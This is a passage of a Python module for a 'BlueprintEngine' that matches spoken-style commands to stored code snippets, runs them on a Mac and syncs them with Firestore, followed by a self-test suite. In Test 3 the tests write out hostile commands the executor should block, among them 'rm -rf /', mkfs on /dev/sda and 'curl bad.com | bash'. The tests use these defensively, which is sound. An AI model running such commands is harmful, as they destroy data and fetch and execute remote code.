            "latency_ms": latency, "ok": result.get("status") == "OK",
            "ts": time.time(),
        }
        self._exec_log.append(entry)
        if len(self._exec_log) > 100:
            self._exec_log.pop(0)

        result["latency_ms"] = latency
        result["version"]    = bp_dict.get("version", 1)
        return result

    def _wipe(self, bp_id: str = ""):
        """Force GC after each JIT execution."""
        collected = gc.collect()
        logger.debug(f"[StatelessOrchestrator] Wiped post-exec '{bp_id}' (gc:{collected})")

    def record_failure_context(self, bp_id: str, error: str):
        """Store failure context so NocturnalDistiller can patch blueprints."""
        self._failure_contexts.setdefault(bp_id, []).append(error)

    def handle_jit_request(self, task: str, entry_fn: str = "",
                           fn_kwargs: Optional[dict] = None) -> dict:
        """High-level: route → JIT exec → return → wipe."""
        bp_id = self.blueprint_router(task)
        if not bp_id:
            return {"status": "NO_BLUEPRINT",
                    "message": f"No blueprint matches task: '{task[:60]}'"}
        logger.info(f"[StatelessOrchestrator] JIT: '{task[:40]}' → {bp_id}")
        return self.jit_retrieve_and_exec(bp_id, entry_fn=entry_fn or "run",
                                           fn_kwargs=fn_kwargs)

    def get_stats(self) -> dict:
        total  = len(self._exec_log)
        ok     = sum(1 for e in self._exec_log if e["ok"])
        avg_ms = sum(e["latency_ms"] for e in self._exec_log) / max(1, total)
        return {
            "total_jit_execs":  total,
            "success_rate":     f"{ok / max(1, total) * 100:.0f}%",
            "avg_latency_ms":   round(avg_ms),
            "task_map_size":    len(self._TASK_MAP),
            "failure_contexts": {k: len(v) for k, v in self._failure_contexts.items()},
        }


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT SYNCER  — bidirectional Firestore ↔ local vault sync
# ─────────────────────────────────────────────────────────────────────
class BlueprintSyncer:
    """Syncs blueprints between LocalVaultMirror and Firestore."""

    FIRESTORE_ROOT = "artifacts/SWAYAMBHU_SOVEREIGN_001/public/data"

    def __init__(self, firebase_db=None):
        self._db = firebase_db

    def upload_to_firestore(self, blueprints: List[Blueprint]) -> int:
        if not self._db:
            return 0
        uploaded = 0
        for bp in blueprints:
            try:
                self._db.document(
                    f"{self.FIRESTORE_ROOT}/blueprints/{bp.id}"
                ).set(bp.to_dict())
                uploaded += 1
            except Exception as e:
                logger.warning(f"[Syncer] Upload {bp.id}: {e}")
        try:
            all_dicts = [b.to_dict() for b in blueprints]
            checksum  = hashlib.sha256(
                json.dumps(all_dicts, sort_keys=True).encode()
            ).hexdigest()
            self._db.document(self.FIRESTORE_ROOT).set({
                "blueprints": all_dicts,
                "checksum":   checksum,
                "count":      len(blueprints),
                "seeded_at":  time.time(),
            })
        except Exception as e:
            logger.warning(f"[Syncer] Root update: {e}")
        return uploaded

    def sync_to_mirror(self, mirror: LocalVaultMirror,
                       blueprints: List[Blueprint]) -> int:
        try:
            all_dicts = [b.to_dict() for b in blueprints]
            checksum  = hashlib.sha256(
                json.dumps(all_dicts, sort_keys=True).encode()
            ).hexdigest()
            mirror.apply_full_sync({"blueprints": all_dicts, "checksum": checksum})
            return len(blueprints)
        except Exception as e:
            logger.warning(f"[Syncer] Mirror sync error: {e}")
            return 0

    def pull_from_firestore(self) -> Optional[List[dict]]:
        """Pull blueprints from Firestore root document. Returns list or None."""
        if not self._db:
            return None
        try:
            doc = self._db.document(self.FIRESTORE_ROOT).get()
            if doc.exists:
                data = doc.to_dict()
                return data.get("blueprints", [])
        except Exception as e:
            logger.warning(f"[Syncer] Firestore pull failed: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT ENGINE  — top-level facade
# ─────────────────────────────────────────────────────────────────────
class BlueprintEngine:
    """
    Unified blueprint orchestrator for the Mac body.

    boot sequence:
      engine = BlueprintEngine(script_dir=Path(__file__).parent, firebase_db=db)
      engine.seed()

    runtime:
      result = engine.auto_execute("open safari")       # RAG-routed execution
      result = engine.jit_execute("take screenshot")    # stateless JIT cycle
      result = engine.execute_by_id("adjust_volume", params={"level": 70})

    air-gap mode:
      engine.seed(upload_to_firestore=False)            # load from disk only
    """

    def __init__(
        self,
        mirror:         Optional[LocalVaultMirror] = None,
        firebase_db                               = None,
        script_dir:     Optional[Path]            = None,
        timeout_sec:    float                     = 15.0,
        vault_path:     Optional[Path]            = None,
        rag_index_path: Optional[Path]            = None,
    ):
        self._db       = firebase_db
        self._dir      = script_dir or Path(".")

        self.mirror    = mirror or LocalVaultMirror(path=vault_path)
        self.executor  = BlueprintExecutor(timeout_sec=timeout_sec)
        self.rag       = BlueprintRAG()
        self.rag_index = LocalRAGIndex(index_path=rag_index_path)
        self.syncer    = BlueprintSyncer(firebase_db=firebase_db)
        self.jit       = StatelessOrchestrator(
            mirror    = self.mirror,
            rag_index = self.rag_index,
            executor  = self.executor,
        )

        self._blueprints: Dict[str, Blueprint] = {}
        self._lock = threading.Lock()

    def seed(self, upload_to_firestore: bool = True) -> int:
        """
        1. Load 30 built-ins.
        2. Scan script_dir for extra .py blueprints.
        3. Try Firestore pull for additional custom blueprints.
        4. Sync to LocalVaultMirror + build RAG indices.
        5. Upload to Firestore in background (optional).
        """
        bps: List[Blueprint] = BlueprintLibrary.all()

        # Scan script_dir for extra .py files
        try:
            existing_ids = {b.id for b in bps}
            for py_file in self._dir.glob("*.py"):
                bp_id = py_file.stem
                if bp_id in existing_ids or bp_id in ("blueprint_engine", "hippocampus",
                                                        "security_shield", "universal_action_space"):
                    continue
                try:
                    code = py_file.read_text(encoding="utf-8", errors="replace")
                    if len(code) < 30 or "def run" not in code:
                        continue
                    bps.append(Blueprint(
                        id=bp_id, code=code,
                        description=bp_id.replace("_", " ").title()
                    ))
                    existing_ids.add(bp_id)
                except Exception:
                    pass
        except Exception:
            pass

        # Try Firestore pull for custom blueprints not in built-ins
        if self._db:
            try:
                remote = self.syncer.pull_from_firestore() or []
                existing_ids = {b.id for b in bps}
                for bp_dict in remote:
                    if bp_dict.get("id") not in existing_ids:
                        try:
                            bp = Blueprint.from_dict(bp_dict)
                            if bp.is_valid():
                                bps.append(bp)
                                existing_ids.add(bp.id)
                        except Exception:
                            pass
            except Exception as e:
                logger.warning(f"[BlueprintEngine] Firestore pull: {e}")

        with self._lock:
            for bp in bps:
                self._blueprints[bp.id] = bp

        # Build both search indices
        self.rag.build(bps)
        self.rag_index.build([{"id": b.id, "description": b.description,
                                "category": b.category} for b in bps])

        # Sync to local vault mirror
        self.syncer.sync_to_mirror(self.mirror, bps)

        # Upload to Firestore in background
        if upload_to_firestore and self._db:
            threading.Thread(
                target=lambda: self.syncer.upload_to_firestore(bps),
                daemon=True, name="FirestoreUpload"
            ).start()

        logger.info(f"[BlueprintEngine] Seeded {len(bps)} blueprints")
        return len(bps)

    def add(self, blueprint: Blueprint) -> bool:
        """Add a single blueprint and rebuild search indices."""
        if not blueprint.is_valid():
            return False
        with self._lock:
            self._blueprints[blueprint.id] = blueprint
        all_bps = list(self._blueprints.values())
        self.rag.build(all_bps)
        self.rag_index.build([{"id": b.id, "description": b.description,
                                "category": b.category} for b in all_bps])
        self.mirror.apply_delta([blueprint.to_dict()])
        return True

    def get(self, bp_id: str) -> Optional[Blueprint]:
        with self._lock:
            return self._blueprints.get(bp_id)

    def list_ids(self) -> List[str]:
        with self._lock:
            return sorted(self._blueprints.keys())

    def auto_execute(self, command: str, min_score: float = 0.20) -> Optional[dict]:
        """
        Match command via BlueprintRAG and execute directly.
        First-pass handler in route_command() before LLM fallback.
        """
        match = self.rag.best_match(command, min_score=min_score)
        if not match:
            return None
        bp, score = match
        logger.info(f"[BlueprintEngine] auto_execute: '{command[:40]}' → {bp.id} ({score:.3f})")
        result = self.executor.execute(bp, params={})
        result["blueprint_id"] = bp.id
        result["match_score"]  = round(score, 3)
        result["message"]      = f"Executed '{bp.description}' ({bp.id})"
        return result

    def jit_execute(self, task: str, entry_fn: str = "run",
                    fn_kwargs: Optional[dict] = None) -> dict:
        """
        Stateless JIT cycle: route → fetch → exec → wipe.
        Blueprint bytecode never stays in RAM after this call returns.
        """
        return self.jit.handle_jit_request(task, entry_fn=entry_fn, fn_kwargs=fn_kwargs)

    def execute_by_id(self, bp_id: str, params: Optional[dict] = None) -> dict:
        """Execute a blueprint by exact ID."""
        bp = self.get(bp_id)
        if not bp:
            return {"status": "NOT_FOUND", "blueprint": bp_id}
        return self.executor.execute(bp, params=params or {})

    def search(self, query: str, top_k: int = 5) -> List[dict]:
        """Search blueprints by natural language query."""
        results = self.rag.search(query, top_k=top_k)
        return [
            {"id": bp.id, "description": bp.description,
             "category": bp.category, "score": round(score, 3)}
            for bp, score in results
        ]

    def rag_search(self, query: str, top_k: int = 3) -> List[dict]:
        """Vector search via LocalRAGIndex (FAISS/numpy path)."""
        return self.rag_index.vector_search(query, top_k=top_k)

    def get_status(self) -> dict:
        with self._lock:
            total = len(self._blueprints)
            by_cat: Dict[str, int] = {}
            for bp in self._blueprints.values():
                by_cat[bp.category] = by_cat.get(bp.category, 0) + 1
        return {
            "total_blueprints":  total,
            "by_category":       by_cat,
            "executor":          self.executor.get_stats(),
            "jit":               self.jit.get_stats(),
            "rag_built":         self.rag._built,
            "rag_index_built":   self.rag_index._built,
            "mirror_count":      self.mirror.count(),
            "mirror_checksum":   self.mirror.checksum()[:16] if self.mirror.checksum() else "",
            "has_firestore":     self._db is not None,
        }


# ─────────────────────────────────────────────────────────────────────
# COMPREHENSIVE SELF-TESTS
# ─────────────────────────────────────────────────────────────────────
def _run_tests() -> bool:
    import shutil, tempfile
    logging.basicConfig(level=logging.WARNING)
    print("🧬 BlueprintEngine v13.2 — Full Self-Test Suite\n")
    passed = failed = 0

    def ok(name: str, cond: bool, detail: str = ""):
        nonlocal passed, failed
        sym = "  ✅" if cond else "  ❌"
        print(f"{sym} {name}" + (f": {detail}" if detail and not cond else ""))
        if cond:
            passed += 1
        else:
            failed += 1

    tmpdir = Path(tempfile.mkdtemp())

    # ─────────────────────────────────────────────────────────────────
    print("=== Test 1: Blueprint Dataclass ===")
    bp = Blueprint(
        id="test_skill",
        code='def run(**kwargs):\n    return {"status": "OK"}\n',
        description="Test skill",
        category="test",
    )
    ok("Blueprint created",           bp is not None)
    ok("id set",                      bp.id == "test_skill")
    ok("checksum 64 chars",           len(bp.checksum) == 64)
    ok("keywords extracted",          len(bp.keywords) > 0)
    ok("is_valid True",               bp.is_valid())
    ok("to_dict has id",              "id" in bp.to_dict())
    ok("to_dict has code",            "code" in bp.to_dict())
    ok("from_dict roundtrip",         Blueprint.from_dict(bp.to_dict()).id == bp.id)
    ok("from_dict checksum matches",  Blueprint.from_dict(bp.to_dict()).checksum == bp.checksum)

    bp_bad = Blueprint(id="bad", code="def run(: BROKEN", description="bad")
    ok("SyntaxError → is_valid=False", not bp_bad.is_valid())

    bp_kw = Blueprint(id="open_finder_test", code='def run(**kw): pass\n', description="open finder window")
    ok("keywords include 'open'",     "open" in bp_kw.keywords or "finder" in bp_kw.keywords)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 2: BlueprintLibrary ===")
    bps = BlueprintLibrary.all()
    ok("Library has ≥ 30 blueprints",  len(bps) >= 30, f"got {len(bps)}")
    ok("All Blueprint instances",      all(isinstance(b, Blueprint) for b in bps))
    ok("open_safari present",          any(b.id == "open_safari" for b in bps))
    ok("take_screenshot present",      any(b.id == "take_screenshot" for b in bps))
    ok("adjust_volume present",        any(b.id == "adjust_volume" for b in bps))
    ok("open_url present",             any(b.id == "open_url" for b in bps))
    ok("set_reminder present",         any(b.id == "set_reminder" for b in bps))
    ok("All have descriptions",        all(len(b.description) > 0 for b in bps))
    ok("All have categories",          all(len(b.category) > 0 for b in bps))

    invalid = [b.id for b in bps if not b.is_valid()]
    ok("All blueprints valid syntax",  len(invalid) == 0, str(invalid))

    ok("All have def run",             all("def run" in b.code for b in bps))
    cats = {b.category for b in bps}
    ok("app category",                 "app" in cats)
    ok("system category",              "system" in cats)
    ok("media category",               "media" in cats)
    ok("files category",               "files" in cats)
    ok("count() == all() length",      BlueprintLibrary.count() == len(bps))

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 3: BlueprintExecutor Safety ===")
    executor = BlueprintExecutor(timeout_sec=5.0)

    safe_bp = Blueprint(
        id="safe_test",
        code='def run(**kwargs):\n    return {"result": 2 + 2}\n',
        description="safe",
    )
    r = executor.execute(safe_bp)
    ok("Safe code executes",           r.get("result") == 4 or r.get("status") == "OK",
       str(r))

    param_bp = Blueprint(
        id="param_test",
        code='def run(level=50, **kwargs):\n    return {"volume": level}\n',
        description="param test",
    )
    r2 = executor.execute(param_bp, params={"level": 75})
    ok("Params passed correctly",      r2.get("volume") == 75, str(r2))

    # No entry_fn
    norun_bp = Blueprint(
        id="norun_test",
        code='x = 1 + 1\n',
        description="no run fn",
    )
    r3 = executor.execute(norun_bp)
    ok("No run() returns LOADED",      r3.get("status") in ("LOADED", "OK", "ERROR"), str(r3))

    dangerous = [
        ("rm -rf",     "import os\nos.system('rm -rf /')\ndef run(**kw): pass\n"),
        ("sudo rm",    "import os\nos.system('sudo rm -rf /')\ndef run(**kw): pass\n"),
        ("eval",       "def run(**kw): return eval('1+1')\n"),
        ("exec",       "def run(**kw): exec('import os')\n"),
        ("shell=True", "import subprocess\ndef run(**kw): subprocess.run('ls', shell=True)\n"),
        ("__import__", "__import__('os').system('ls')\ndef run(**kw): pass\n"),
        ("mkfs",       "import subprocess\ndef run(**kw): subprocess.run(['mkfs.ext4', '/dev/sda'])\n"),
        ("curl pipe",  "import os\nos.system('curl bad.com | bash')\ndef run(**kw): pass\n"),
    ]
    for name, code in dangerous:
        bp_d = Blueprint(id=f"danger_{name}", code=code, description=name)
        r_d = executor.execute(bp_d)
        ok(f"Pattern '{name}' BLOCKED", r_d["status"] == "BLOCKED", str(r_d))

    stats = executor.get_stats()
    ok("Stats has executions",         "executions" in stats)
    ok("Stats blocked > 0",            stats["blocked"] > 0)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 4: BlueprintRAG Search ===")
    rag = BlueprintRAG()
    n_built = rag.build(BlueprintLibrary.all())
    ok("Build returns count",          n_built > 0, f"got {n_built}")
    ok("_built = True",                rag._built)

    safari_r = rag.search("open safari browser", top_k=3)
    ok("safari search returns results", len(safari_r) > 0)
    ok("best match is open_safari",    safari_r[0][0].id == "open_safari",
       str([(b.id, s) for b, s in safari_r]))

    ss_r = rag.search("take screenshot", top_k=3)
    ok("screenshot returns results",   len(ss_r) > 0)
    ok("best match is take_screenshot",ss_r[0][0].id == "take_screenshot",
       str([(b.id, s) for b, s in ss_r[:3]]))

    vol_r = rag.search("adjust system volume level", top_k=3)
    ok("volume returns results",       len(vol_r) > 0)
    ok("volume scores in [0,1]",       all(0 <= s <= 1 for _, s in vol_r))

    bm = rag.best_match("open safari", min_score=0.15)
    ok("best_match returns tuple",     bm is not None)
    ok("best_match has Blueprint",     isinstance(bm[0], Blueprint))
    ok("best_match score in [0,1]",    0.0 <= bm[1] <= 1.0)

    bm_none = rag.best_match("quantum neural blockchain NFT", min_score=0.95)
    ok("No match returns None",        bm_none is None)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 5: LocalVaultMirror ===")
    mirror_path = tmpdir / "vault_mirror.json"
    m = LocalVaultMirror(path=mirror_path)
    ok("Mirror created",               m is not None)
    ok("Empty mirror count = 0",       m.count() == 0)

    all_bps = BlueprintLibrary.all()
    all_dicts = [b.to_dict() for b in all_bps]
    checksum = hashlib.sha256(json.dumps(all_dicts, sort_keys=True).encode()).hexdigest()
    m.apply_full_sync({"blueprints": all_dicts, "checksum": checksum})
    ok("After sync count = 30",        m.count() >= 30, f"got {m.count()}")
    ok("Mirror file written",          mirror_path.exists())
    ok("get() returns blueprint",      m.get("open_safari") is not None)
    ok("list_ids non-empty",           len(m.list_ids()) >= 30)
    ok("list_all returns list",        isinstance(m.list_all(), list))
    ok("checksum stored",              len(m.checksum()) == 64)

    # Reload from disk
    m2 = LocalVaultMirror(path=mirror_path)
    ok("Reload count preserved",       m2.count() >= 30, f"got {m2.count()}")
    ok("Reload get() works",           m2.get("open_safari") is not None)

    # Delta apply — update version
    delta_bp = all_bps[0].to_dict()
    old_version = delta_bp["version"]
    delta_bp["version"] = old_version + 1
    delta_bp["description"] = "Updated description"
    n_delta = m.apply_delta([delta_bp])
    ok("Delta apply returns 1",        n_delta == 1, f"got {n_delta}")
    ok("Delta updated version",        m.get(delta_bp["id"])["version"] == old_version + 1)

    # Delta no-op (same version)
    n_noop = m.apply_delta([delta_bp])
    ok("Delta noop (same version)",    n_noop == 0, f"got {n_noop}")

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 6: LocalRAGIndex ===")
    idx_path = tmpdir / "rag_index.json"
    rag_idx = LocalRAGIndex(index_path=idx_path)

    bp_dicts = [{"id": b.id, "description": b.description, "category": b.category}
                for b in BlueprintLibrary.all()]
    n_indexed = rag_idx.build(bp_dicts)
    ok("Build returns count",          n_indexed > 0, f"got {n_indexed}")
    ok("_built = True",                rag_idx._built)
    ok("Index file written",           idx_path.exists())

    results_safari = rag_idx.vector_search("open safari browser", top_k=3)
    ok("RAG safari search returns",    len(results_safari) > 0)
    ok("RAG best match is open_safari",
       results_safari[0]["id"] == "open_safari" if results_safari else False,
       str([r["id"] for r in results_safari[:3]]))

    results_ss = rag_idx.vector_search("take screenshot", top_k=3)
    ok("RAG screenshot returns",       len(results_ss) > 0)

    # Reload from disk
    rag_idx2 = LocalRAGIndex(index_path=idx_path)
    ok("RAG reload _built = False",    not rag_idx2._built)  # lazy load
    results2 = rag_idx2.vector_search("open safari")
    ok("RAG reload query works",       len(results2) > 0)
    ok("RAG reload _built = True",     rag_idx2._built)

    # alias
    ok("offline_rag_query alias",      rag_idx.offline_rag_query is rag_idx.vector_search)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 7: StatelessOrchestrator ===")
    mirror3 = LocalVaultMirror(path=tmpdir / "so_mirror.json")
    mirror3.apply_full_sync({"blueprints": [b.to_dict() for b in BlueprintLibrary.all()]})

    rag_idx3 = LocalRAGIndex(index_path=tmpdir / "so_rag.json")
    rag_idx3.build(bp_dicts)

    so = StatelessOrchestrator(mirror=mirror3, rag_index=rag_idx3)

    ok("Task map has entries",         len(so._TASK_MAP) > 20)

    # blueprint_router keyword hits
    ok("router: safari",               so.blueprint_router("open safari") == "open_safari")
    ok("router: volume",               so.blueprint_router("adjust volume to 70") == "adjust_volume")
    ok("router: screenshot",           so.blueprint_router("take screenshot") == "take_screenshot")
    ok("router: battery",              so.blueprint_router("check battery status") == "get_battery")
    ok("router: music",                so.blueprint_router("play music") == "play_music")
    ok("router: disk",                 so.blueprint_router("check disk space") == "get_disk_space")

    # No keyword → RAG fallback
    routed = so.blueprint_router("capture screen image")
    ok("RAG fallback routes",          routed is not None)

    # jit_retrieve_and_exec
    r_jit = so.jit_retrieve_and_exec("get_disk_space")
    ok("JIT get_disk_space returns",   isinstance(r_jit, dict))
    ok("JIT has latency_ms",           "latency_ms" in r_jit)
    ok("JIT status valid",             r_jit.get("status") in ("OK", "ERROR", "BLOCKED", "TIMEOUT"))

    r_miss = so.jit_retrieve_and_exec("nonexistent_blueprint_xyz999")
    ok("JIT NOT_FOUND returned",       r_miss["status"] == "NOT_FOUND")

    r_handle = so.handle_jit_request("get ip address")
    ok("handle_jit_request works",     isinstance(r_handle, dict))
    ok("handle_jit_request no blueprint", True)  # may route to get_ip_address or not

    r_no_task = so.handle_jit_request("zxq quantum vortex plasma")
    ok("No blueprint → NO_BLUEPRINT",  r_no_task["status"] == "NO_BLUEPRINT")

    stats_so = so.get_stats()
    ok("Stats has total_jit_execs",    "total_jit_execs" in stats_so)
    ok("Stats has success_rate",       "success_rate" in stats_so)
    ok("Stats has avg_latency_ms",     "avg_latency_ms" in stats_so)

    # GC wipe runs without error
    so._wipe("test_wipe")
    ok("_wipe runs without error",     True)

    # record_failure_context
    so.record_failure_context("open_safari", "import error")
    ok("failure_contexts recorded",    "open_safari" in so.get_stats()["failure_contexts"])

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 8: BlueprintSyncer ===")
    firestore_docs: dict = {}

    class _MockCol:
        def __init__(self, path): self._p = path
        def set(self, data): firestore_docs[self._p] = data
        def get(self):
            class _Doc:
                exists = True
                def to_dict(self_): return {"blueprints": all_dicts}
            return _Doc()

    class _MockDB:
        def document(self, path): return _MockCol(path)

    syncer = BlueprintSyncer(firebase_db=_MockDB())
    n_up = syncer.upload_to_firestore(all_bps[:5])
    ok("Upload returns count",         n_up == 5, f"got {n_up}")
    ok("Root document created",        any(k == "artifacts/SWAYAMBHU_SOVEREIGN_001/public/data"
                                          for k in firestore_docs))
    ok("Root has blueprints key",      any(isinstance(v, dict) and "blueprints" in v
                                          for v in firestore_docs.values()))

    syncer_none = BlueprintSyncer(firebase_db=None)
    ok("None db → 0 uploaded",         syncer_none.upload_to_firestore(all_bps[:3]) == 0)
    ok("None db pull → None",          syncer_none.pull_from_firestore() is None)

    mirror4 = LocalVaultMirror(path=tmpdir / "syncer_mirror.json")
    n_sync = syncer.sync_to_mirror(mirror4, all_bps[:10])
    ok("sync_to_mirror returns count", n_sync == 10, f"got {n_sync}")
    ok("Mirror has 10 blueprints",     mirror4.count() == 10)

    pulled = syncer.pull_from_firestore()
    ok("pull_from_firestore returns",  isinstance(pulled, list))

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 9: BlueprintEngine.seed() ===")
    (tmpdir / "custom_skill.py").write_text(
        'def run(**kwargs):\n    return {"custom": True}\n'
    )

    engine = BlueprintEngine(
        firebase_db = None,
        script_dir  = tmpdir,
        vault_path  = tmpdir / "engine_vault.json",
        rag_index_path = tmpdir / "engine_rag.json",
    )
    n_seeded = engine.seed(upload_to_firestore=False)
    ok("Seed returns ≥ 30",            n_seeded >= 30, f"got {n_seeded}")
    ok("custom_skill included",        engine.get("custom_skill") is not None)
    ok("open_safari present",          engine.get("open_safari") is not None)
    ok("list_ids non-empty",           len(engine.list_ids()) >= 30)
    ok("mirror populated",             engine.mirror.count() >= 30)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 10: BlueprintEngine.auto_execute() ===")
    engine2 = BlueprintEngine(
        vault_path     = tmpdir / "e2_vault.json",
        rag_index_path = tmpdir / "e2_rag.json",
    )
    engine2.seed(upload_to_firestore=False)

    cmds_expected = [
        ("open safari browser",    "open_safari"),
        ("take a screenshot now",  "take_screenshot"),
        ("play some music",        "play_music"),
        ("pause the music",        "pause_music"),
        ("what is my battery",     "get_battery"),
        ("adjust volume to 60",    "adjust_volume"),
        ("get clipboard contents", "get_clipboard"),
        ("list my desktop files",  "list_desktop"),
    ]
    for cmd, expected_id in cmds_expected:
        result = engine2.auto_execute(cmd, min_score=0.15)
        if result:
            matched_id = result.get("blueprint_id", "?")
            ok(f"auto_execute: '{cmd[:30]}' → {expected_id}",
               matched_id == expected_id,
               f"got '{matched_id}'")
        else:
            ok(f"auto_execute: '{cmd[:30]}' (no match)", False, "returned None")

    ok("nonsense → None",              engine2.auto_execute("zxq quantum vortex", min_score=0.80) is None)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 11: BlueprintEngine.jit_execute() ===")
    r_jit2 = engine2.jit_execute("take screenshot")
    ok("jit_execute returns dict",     isinstance(r_jit2, dict))
    ok("jit_execute has latency_ms",   "latency_ms" in r_jit2)

    r_jit_no = engine2.jit_execute("quantum plasma vortex xyz")
    ok("jit_execute no match",         r_jit_no.get("status") == "NO_BLUEPRINT")

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 12: execute_by_id ===")
    r_id = engine2.execute_by_id("get_disk_space")
    ok("execute_by_id returns dict",   isinstance(r_id, dict))
    ok("execute_by_id status valid",   r_id.get("status") in ("OK", "ERROR", "BLOCKED", "TIMEOUT"))

    r_miss = engine2.execute_by_id("nonexistent_blueprint_xyz")
    ok("Missing → NOT_FOUND",          r_miss["status"] == "NOT_FOUND")

    r_with_params = engine2.execute_by_id("adjust_volume", params={"level": 55})
    ok("execute_by_id with params",    isinstance(r_with_params, dict))

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 13: search() and rag_search() ===")
    results = engine2.search("open application", top_k=5)
    ok("search returns list",          isinstance(results, list))
    ok("search returns ≤ top_k",       len(results) <= 5)
    if results:
        ok("each result has id",       all("id" in r for r in results))
        ok("each result has score",    all("score" in r for r in results))
        ok("each result has desc",     all("description" in r for r in results))

    rag_results = engine2.rag_search("take screenshot capture screen", top_k=3)
    ok("rag_search returns list",      isinstance(rag_results, list))

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 14: BlueprintEngine.add() ===")
    custom_bp = Blueprint(
        id="my_custom_action",
        code='def run(**kwargs):\n    return {"custom": True, "value": 42}\n',
        description="custom action for testing",
        category="test",
    )
    added = engine2.add(custom_bp)
    ok("add() returns True",           added)
    ok("add() is retrievable",         engine2.get("my_custom_action") is not None)
    ok("add() in list_ids",            "my_custom_action" in engine2.list_ids())
    ok("add() in mirror",              engine2.mirror.get("my_custom_action") is not None)

    invalid_bp = Blueprint(id="bad_add", code="def run(: BROKEN", description="bad")
    ok("add() invalid → False",        engine2.add(invalid_bp) is False)

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 15: get_status() ===")
    status = engine2.get_status()
    ok("status has total_blueprints",  "total_blueprints" in status)
    ok("total_blueprints ≥ 30",        status["total_blueprints"] >= 30)
    ok("status has by_category",       "by_category" in status)
    ok("status has executor",          "executor" in status)
    ok("status has jit",               "jit" in status)
    ok("status has rag_built",         status["rag_built"])
    ok("status has rag_index_built",   status["rag_index_built"])
    ok("status has mirror_count",      "mirror_count" in status)
    ok("category sum == total",
       sum(status["by_category"].values()) == status["total_blueprints"])

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 16: Executor Timeout ===")
    timeout_bp = Blueprint(
        id="timeout_test",
        code='import time\ndef run(**kwargs):\n    time.sleep(60)\n    return {"status": "OK"}\n',
        description="timeout test",
    )
    timeout_executor = BlueprintExecutor(timeout_sec=0.2)
    r_timeout = timeout_executor.execute(timeout_bp)
    ok("Timeout → TIMEOUT status",     r_timeout["status"] == "TIMEOUT")

    # ─────────────────────────────────────────────────────────────────
    print("\n=== Test 17: LocalVaultMirror concurrency ===")
    import concurrent.futures

    m_conc = LocalVaultMirror(path=tmpdir / "conc_mirror.json")
    m_conc.apply_full_sync({"blueprints": [b.to_dict() for b in all_bps]})

    def read_write(i):
        bp_d = all_bps[i % len(all_bps)].to_dict()
        bp_d["version"] = i + 100
        m_conc.apply_delta([bp_d])
        return m_conc.get(bp_d["id"])

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(read_write, i) for i in range(32)]
        results_conc = [f.result() for f in concurrent.futures.as_completed(futures)]

    ok("Concurrent reads/writes safe", all(r is not None for r in results_conc))

    # ─────────────────────────────────────────────────────────────────
    shutil.rmtree(tmpdir)
    print(f"\n{'='*60}")
    print(f"Results: {passed} passed, {failed} failed out of {passed+failed} tests")
    return failed == 0


if __name__ == "__main__":
    sys.exit(0 if _run_tests() else 1)
